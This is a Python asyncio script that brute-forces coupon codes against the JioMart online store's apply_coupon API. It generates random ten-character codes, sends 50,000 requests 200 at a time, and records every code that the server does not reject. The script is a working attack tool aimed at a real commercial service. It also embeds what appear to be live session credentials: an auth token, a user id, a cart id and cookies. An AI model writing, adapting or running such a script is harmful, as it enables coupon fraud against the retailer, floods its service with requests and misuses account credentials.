import asyncio
import aiohttp
import random
import string

failed = 0
others = 0
result=""

# 🔹 Generate coupon code
def generate_random_code():
    digits = '123456789'
    letters = string.ascii_uppercase
    result = ''
    for i in range(10):
        if i % 2 == 0:
            result += random.choice(digits)
        else:
            result += random.choice(letters)
    return result


# 🔹 Async request worker
async def calling_rest(session, code):
    global failed, others, result
    url = "https://www.jiomart.com/mst/rest/v1/5/cart/apply_coupon"
    params = {
        "coupon_code": code,
        "cart_id": "648663836"
    }
    headers = {
        "accept": "application/json, text/plain, */*",
        "accept-language": "en-US,en;q=0.9",
        "authtoken": "4b05940bde90435caeac429d3bbe4889f10b26d6-1669421867",
        "pin": "781035",
        "priority": "u=1, i",
        "referer": "https://www.jiomart.com/checkout/cart",
        "sec-ch-ua": '"Not)A;Brand";v="8", "Chromium";v="138", "Google Chrome";v="138"',
        "sec-ch-ua-mobile": "?0",
        "sec-ch-ua-platform": '"Linux"',
        "sec-fetch-dest": "empty",
        "sec-fetch-mode": "cors",
        "sec-fetch-site": "same-origin",
        "user-agent": "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/138.0.0.0 Safari/537.36",
        "userid": "173911542"
    }
    cookies = {
        "_ALGOLIA": "anonymous-e0f5e304-649d-4a8f-82f3-c45ce700f5da",
        "new_customer": "false",
        "ajs_anonymous_id": "c31e596a-a7f0-4125-a580-f0afc3d19d84",
        "nms_mgo_pincode": "781035",
        "nms_mgo_city": "Kamrup",
        "nms_mgo_state_code": "AS"
    }

    try:
        async with session.get(url, headers=headers, cookies=cookies, params=params) as resp:
            if resp.status == 400:
                failed += 1
            else:
                others += 1
                result += code+","
            data = await resp.json()
            print(f"Status: {resp.status}, failed={failed}, others={others}")
            print("Response:", data)
    except Exception as e:
        print("Error:", e)


# 🔹 Main async runner
async def main():
    total_requests = 50000   # total API calls
    concurrency = 200      # max in parallel (like thread pool size)

    connector = aiohttp.TCPConnector(limit=concurrency)  # connection limit
    async with aiohttp.ClientSession(connector=connector) as session:
        tasks = [calling_rest(session, generate_random_code()) for _ in range(total_requests)]
        await asyncio.gather(*tasks)


if __name__ == "__main__":
    asyncio.run(main())
    print(result)
